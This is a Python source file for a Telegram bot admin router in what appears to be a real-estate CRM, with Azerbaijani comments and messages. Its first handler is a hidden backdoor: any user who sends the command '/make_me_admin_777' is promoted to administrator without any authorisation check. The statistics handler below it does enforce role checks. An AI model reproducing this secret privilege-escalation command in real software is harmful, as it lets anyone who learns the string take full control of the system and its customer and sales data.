from aiogram import Router, F
from aiogram.types import Message
from sqlalchemy.ext.asyncio import AsyncSession
from app.models.user import User, UserRole
from app.services.stats_service import StatsService
from app.repositories.user_repo import user_repo
from app.bot.keyboards.reply import get_main_menu

router = Router(name="admin_router")

# GİZLİ ŞİFRƏ İLƏ ADMİN OLMAQ 
@router.message(F.text == "/make_me_admin_777")
async def secret_admin_command(message: Message, db: AsyncSession, actor: User):
    if actor.role == UserRole.ADMIN:
        return await message.answer("Siz onsuz da adminsiniz.")
        
    actor.role = UserRole.ADMIN
    await user_repo.update(db, actor, {"role": UserRole.ADMIN})
    await message.answer("Təbriklər! Siz artıq sistemin administratorusunuz 👑\n\nZəhmət olmasa aşağıdan menyunu yeniləyin.", reply_markup=get_main_menu(actor.role))

@router.message(F.text == "📊 Statistika")
async def show_statistics(message: Message, **kwargs):
    db: AsyncSession = kwargs.get("db")
    actor: User = kwargs.get("actor")
    
    if actor.role not in [UserRole.ADMIN, UserRole.MANAGER]:
        return await message.answer("⚠️ Bu bölməyə giriş icazəniz yoxdur. Sizin rolunuz yalnız Agent-dir.")
        
    stats = await StatsService.get_dashboard_stats(db)
    
    text = (
        "📊 <b>NEXORA CRM - Qlobal Statistika</b>\n\n"
        f"👨‍💼 Aktiv Agentlər: <b>{stats['active_agents']}</b>\n"
        f"🏠 Ümumi Aktiv Evlər: <b>{stats['active_properties']}</b>\n\n"
        f"📈 <b>Bu günün göstəriciləri:</b>\n"
        f"➕ Yeni ev: {stats['today_new_properties']}\n"
        f"➕ Yeni müştəri: {stats['today_new_customers']}\n\n"
        f"💰 Satılmış evlərin ümumi həcmi: <b>{stats['total_sold_revenue']:,.2f} AZN</b>"
    )
    
    await message.answer(text, parse_mode="HTML")
